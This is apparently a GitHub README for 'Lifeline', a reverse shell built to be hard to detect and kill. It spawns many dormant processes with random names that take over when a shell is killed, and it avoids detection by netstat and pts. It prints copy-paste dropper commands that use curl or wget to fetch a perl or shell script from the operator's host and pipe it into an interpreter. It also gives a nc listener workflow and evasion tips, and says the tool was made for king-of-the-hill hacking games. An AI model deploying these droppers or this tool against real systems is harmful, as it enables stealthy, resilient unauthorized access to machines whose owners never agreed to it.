# Lifeline

Lifeline is a reverse shell that's designed to be hard to detect and hard to kill. It does this by spawning many dormant processes with randomized names that can take over when a shell is killed.

tl;dr:
![](.github/meme.png)

It is like the cockroach of reverse shells; Not particularly nice to look at, but it will survive almost anything.


## Features
### Pros
 * Easily spawn many reverse shells as background processes
 * Only one process will connect back to your listener, leaving all other processes undetected by `netstat`
 * The default reverse shell does not use a `pts`, making it harder to detect.
### Cons
 * The reverse shell is extremely bare bones and not super user-friendly.
 * The reverse shell is compiled, making it harder to deploy if your target has a different architecture.


## Depenencies
* GCC
* make
* python3 (used as a basic webserver)

## Usage (basic)
To compile and serve a lifeline binary, use the following command:
```
make serve HOST=x.x.x.x
```
This command will build the binary, create dropper scripts and hosts them using `python3`'s webserver.

```
[~/git/lifeline]~$ make serve HOST=10.0.0.12
=========================================================
  Hosting dropper on http://10.0.0.12:8000...        
  Copy/Paste payloads:                                   
                                                         
 In memory:                                              
  curl http://10.0.0.12:8000/dropper.pl | perl       
  wget -O - http://10.0.0.12:8000/dropper.pl | perl  
                                                         
 Temp file:                                              
  curl http://10.0.0.12:8000/dropper.sh | sh         
  wget -O - http://10.0.0.12:8000/dropper.sh | sh    
=========================================================

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

After which you can open a new terminal with a `nc` listener on port `1337` and wait for the callback.  
From the `nc` listener, you can execute commands directly or drop into an `sh` process using the "!shell" command.

## Usage (advanced)
To compile a lifeline binary, run the make command in the projects root and supply the IP address of your listener as follows:
```
make HOST=x.x.x.x PORT=xxxx NUM=x
```
* `PORT`: Listener port, defaults to `1337`
* `NUM`: Number of processes started by a dropper, defaults to `10`


## Practicalities
* Since the lifeline processes are spawned in quick succession, they will likely have sequential `PID`'s. Spawning a small amount of new shells manually will yield better results than spawning 100 shells at once.
* By spawning a few lifelines without opening a listener, you can keep the processes hidden until your other shells are killed.

## F.A.Q.
### Q; Does this provide an persistance against reboots?
No, I created this program mostly for "KOTH"-like hacking games, where reboots aren't really an issue. 
### Q; Why is the shell so bad?
The default "shell" is actually just a bunch of `popen` calls. You can used "!shell" to drop into a normal reverse shell which you can stabilize with python or pwncat.  

The rationale behind this is that I want to keep control over the process to facilitate reconnecting, which is not possible once you set up a normal reverse shell with `execve`.